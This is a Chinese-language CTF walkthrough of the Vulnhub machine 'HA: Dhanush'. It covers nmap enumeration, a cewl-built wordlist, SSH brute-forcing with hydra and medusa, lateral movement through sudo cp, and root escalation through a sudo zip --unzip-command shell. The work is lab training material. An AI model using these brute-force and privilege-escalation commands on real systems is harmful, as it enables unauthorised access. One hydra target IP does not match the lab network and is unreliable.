---
layout: post
title: "Dhanush walkthrough"
date: 2021-10-05
author: 2hanx
toc: true
categories: [Vulnhub]
tags: []
---

### 主机识别

`arp-scan -l`

### 网络拓扑

| 计算机        | IP                |
| ------------- | ----------------- |
| 本机（Win10） | `192.168.174.1`   |
| Kali          | `192.168.174.128` |
| Dhanush       | `192.168.174.133` |

### 扫描端口和版本信息

`nmap -A -p- 192.168.174.133`

```shell
┌──(root💀kali)-[~]
└─# nmap -A -p- 192.168.174.133
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-05 06:20 EDT
Stats: 0:00:03 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Nmap scan report for 192.168.174.133
Host is up (0.00057s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HA: Dhanush
65345/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e3:2f:3d:dd:ac:42:d4:d5:de:ec:9b:19:0b:45:3e:13 (RSA)
|   256 89:02:8d:a5:e0:75:a5:34:3b:52:3a:6c:d1:f4:05:da (ECDSA)
|_  256 ea:af:62:07:73:d0:d5:1e:fb:a9:12:62:34:27:52:d9 (ED25519)
MAC Address: 00:0C:29:27:59:ED (VMware)
```

扫描结果比较简洁，观察到靶机将 *ssh* 服务的默认端口改成了 **65345** 端口，此外访问网页也没发现有价值的信息，此外尝试多个字典进行目录枚举也依旧无果。想到作者提示的 **枚举是关键**， 那就只能是 ssh 用户名和密码枚举了。如果熟悉 vulnhub上作者的套路的话就会知道大多都可以通过 *cewl* 爬取网页上的内容来生成字典。

我们通过 *cewl* 得到密码字典之后再对字典文件中的非ASCII字符进行过滤，命令为：`tr -d '\200-\377' < dic.txt | sort | uniq > dic1.txt`。之后执行 *hydra* 工具的爆破命令：`hydra -L dict1.txt 192.168.143.133 ssh -s 65345 -e nsr`，最后得到正确的账户和密码：`pinak:Gandiv`。

### Getshell

使用爆破出来的账户名和密码登录到服务器，之后进行常规信息收集。

```shell
┌──(root💀kali)-[~]
└─# ssh pinak@192.168.174.133 -p 65345
pinak@192.168.174.133's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
......

pinak@ubuntu:~$ id
uid=1001(pinak) gid=1001(pinak) groups=1001(pinak)
pinak@ubuntu:~$ sudo -l
Matching Defaults entries for pinak on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pinak may run the following commands on ubuntu:
    (sarang) NOPASSWD: /bin/cp
```

发现该用户可执行 *sarang* 账户下的 */bin/cp* 命令，这里进行 *sarang* 用户的免密ssh登录配置即可。

#### 提权 

之后登录到 *sarang* 账户下，查看具备的特殊权限时发现可执行 *root* 账户下的 `/usr/bin/zip`命令，因此这里就是一个 `zip` 本地提权操作。

```shell
sarang@ubuntu:~/.ssh$ sudo -l
Matching Defaults entries for sarang on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sarang may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/zip
sarang@ubuntu:~/.ssh$ /usr/bin/zip
```

执行命令： `sudo /usr/bin/zip a.zip a.txt -T --unzip-command="sh -c /bin/bash"`即可提权到 *root* ，读取 `/root/flag.txt`就可以拿到flag。

```shell
sarang@ubuntu:~$ touch a.txt
sarang@ubuntu:~$ sudo /usr/bin/zip a.zip a.txt -T --unzip-command="sh -c /bin/bash"
updating: a.txt (stored 0%)
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:~# cd /root
root@ubuntu:/root# ls
flag.txt
root@ubuntu:/root# cat flag.txt

                                            @p
                                           @@@.
                                          @@@@@
                                         @@@@@@@
                                        *"`]@P ^^
                                           ]@P
                                           ]@P
                               ,,,,        ]@P       ,,gg,,
                           g@@@@@@@@@b     ]@P    ,@@@@@@@@@@g,
                        ,@@@@@@BNPPNB@@@@@@@@@@@@@@@@P**PNB@@@@@w
                      g@@@@P^`        %NNNNN@NNNNNP          *B@@@g
                    g@@@P`                 -@                   "B@@w
                  ,@@@`                    ]@                      %@@,
                 @@P-                      ]@                        *@@,
              ,@@"                         ]@                          *B@
            ,@N"                          y@@B                            %@,
      ,,  g@P-                            ]@@@P                             *Bg ,gg
      @@@@$,,,,,,,,,,,,,,,,,,,,,,,,,,ggggg@@@@wwwwwwwwwgggggggggww==========mm4NNN"

!! Congrats you have finished this task !!

Contact us here:

Hacking Articles : https://twitter.com/rajchandel/
Nisha Sharma     : https://in.linkedin.com/in/nishasharmaa

+-+-+-+-+-+ +-+-+-+-+-+-+-+
 |E|n|j|o|y| |H|A|C|K|I|N|G|
 +-+-+-+-+-+ +-+-+-+-+-+-+-+
____________________________________
```

### 总结

总体来是比较简单的，主要的难点就是如何获取字典，和ssh爆破。这里再推荐两个ssh爆破工具：

1. medusa：`medusa -h 192.168.174.133 -U dic1.txt -P dic1.txt -M ssh -n 65345 -t 100 `
2. msfconsole: `use auxiliary/scanner/ssh/ssh_login `

此外是对字典的过滤，删除非ASCII字符的命令是：`tr -d '\200-\377' < dic.txt`。

